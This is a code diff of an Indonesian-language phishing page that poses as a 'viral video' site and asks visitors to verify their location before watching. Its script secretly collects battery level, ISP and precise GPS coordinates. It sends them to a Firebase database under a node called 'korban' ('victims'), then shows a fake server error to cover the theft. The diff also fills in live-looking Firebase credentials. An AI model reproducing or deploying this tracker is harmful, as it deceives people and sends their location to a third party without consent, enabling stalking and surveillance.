@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - BERITA VIRAL</title>
+    <title>GNN - VIDEO VIRAL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
@@ -11,56 +11,44 @@
     <div style="background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
         <h2>🔴 VIDEO VIRAL HARI INI</h2>
         <p>Verifikasi lokasi Anda untuk menonton rekaman lengkapnya.</p>
-        <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold;">VERIFIKASI & TONTON</button>
+        <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; cursor:pointer;">VERIFIKASI & TONTON</button>
     </div>
 
 <script>
-    // === TEMPEL CONFIG FIREBASE YANG SAMA DISINI ===
+    // CONFIG KALZ TERPASANG 🎯
     const firebaseConfig = {
-        apiKey: "AIzaSy...",
-        authDomain: "theeyev18.firebaseapp.com",
-        databaseURL: "https://theeyev18-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "theeyev18",
-        storageBucket: "theeyev18.appspot.com",
-        messagingSenderId: "...",
-        appId: "..."
+      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
+      authDomain: "theeyes-8d0aa.firebaseapp.com",
+      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "theeyes-8d0aa",
+      storageBucket: "theeyes-8d0aa.firebasestorage.app",
+      messagingSenderId: "886775568743",
+      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
     };
-    // ========================================
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
     async function gasLacak() {
         const btn = document.getElementById('btn');
-        btn.innerText = "SEDANG MEMPROSES...";
-        
-        let bat = "N/A", isp = "Privat";
-        
+        btn.innerText = "MEMPROSES...";
+        let bat = "N/A", isp = "Mencari...";
         try {
             if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            isp = data.org;
+            const data = await res.json(); isp = data.org;
         } catch(e) {}
 
         navigator.geolocation.getCurrentPosition((pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            
-            // KIRIM DATA KE SATELIT FIREBASE
             db.ref('korban').push({
                 waktu: new Date().toLocaleString(),
                 baterai: bat,
                 isp: isp,
-                maps: `https://www.google.com/maps?q=${lat},${lon}`
+                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
             });
-
-            alert("Koneksi Error: Video gagal dimuat.");
-            btn.innerText = "VERIFIKASI ULANG";
-        }, (err) => {
-            alert("Gagal: Anda harus mengizinkan lokasi!");
-            btn.innerText = "VERIFIKASI ULANG";
-        }, {enableHighAccuracy:true});
+            alert("Error 403: Server Sibuk!");
+            btn.innerText = "COBA LAGI";
+        }, (err) => { alert("Izinkan lokasi!"); }, {enableHighAccuracy:true});
     }
 </script>
 </body>
